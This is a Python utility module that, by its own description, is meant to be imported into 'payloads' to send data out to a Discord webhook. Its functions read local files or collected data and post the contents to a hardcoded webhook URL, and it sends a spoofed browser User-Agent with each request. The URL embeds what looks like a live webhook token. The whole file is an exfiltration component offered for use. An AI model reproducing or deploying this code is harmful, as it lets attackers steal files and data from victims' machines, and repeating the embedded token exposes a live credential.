#!/usr/bin/env python3
"""
Discord Webhook Utility Module
Import this in your payloads to send data to Discord
"""

import json
import urllib.request
import urllib.error
from datetime import datetime

# Set your Discord webhook URL here
WEBHOOK_URL = "https://discord.com/api/webhooks/1485266020259336405/F94tbkuC21wahMedqKV4K3fNkMncOWOkoGvy1LCn-9glkFphSTs0KK4h46oMiUJ5HYJz"

def send_to_discord(title, data, webhook_url=None):
    """
    Send data to Discord webhook
    
    Args:
        title: Message title
        data: Dictionary or string of data to send
        webhook_url: Optional custom webhook URL
    
    Returns:
        bool: True if successful, False otherwise
    """
    url = webhook_url or WEBHOOK_URL
    
    if url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
        print("⚠️  WARNING: Discord webhook URL not configured!")
        print("Set WEBHOOK_URL in webhook_utils.py")
        return False
    
    # Format data as string if it's a dict
    if isinstance(data, dict):
        data_str = "\n".join([f"**{k}:** {v}" for k, v in data.items()])
    else:
        data_str = str(data)
    
    # Create embed
    embed = {
        "embeds": [{
            "title": title,
            "description": data_str[:4000],  # Discord limit
            "color": 15158332,  # Red color
            "timestamp": datetime.utcnow().isoformat(),
            "footer": {
                "text": "Steganography Tool"
            }
        }]
    }
    
    try:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        request = urllib.request.Request(
            url,
            data=json.dumps(embed).encode('utf-8'),
            headers=headers
        )
        
        with urllib.request.urlopen(request, timeout=10) as response:
            return response.status == 204
            
    except urllib.error.URLError as e:
        print(f"Failed to send to Discord: {e}")
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

def send_file_to_discord(title, file_path, webhook_url=None):
    """
    Send a file to Discord webhook
    
    Args:
        title: Message title
        file_path: Path to file to upload
        webhook_url: Optional custom webhook URL
    
    Returns:
        bool: True if successful, False otherwise
    """
    url = webhook_url or WEBHOOK_URL
    
    if url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
        print("⚠️  WARNING: Discord webhook URL not configured!")
        return False
    
    try:
        import os
        if not os.path.exists(file_path):
            print(f"File not found: {file_path}")
            return False
        
        # For file uploads, we'd need requests library
        # For now, just read and send content as text
        with open(file_path, 'rb') as f:
            content = f.read()
        
        # Try to decode as text
        try:
            text_content = content.decode('utf-8')
            return send_to_discord(f"{title} - {os.path.basename(file_path)}", 
                                 f"```\n{text_content[:3900]}\n```")
        except UnicodeDecodeError:
            return send_to_discord(title, 
                                 f"Binary file: {os.path.basename(file_path)} ({len(content)} bytes)")
    
    except Exception as e:
        print(f"Error sending file: {e}")
        return False

# Quick test function
if __name__ == "__main__":
    print("Testing Discord webhook...")
    success = send_to_discord(
        "Test Message",
        {"Status": "Connected", "Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    )
    if success:
        print("✓ Webhook test successful!")
    else:
        print("✗ Webhook test failed. Check WEBHOOK_URL.")
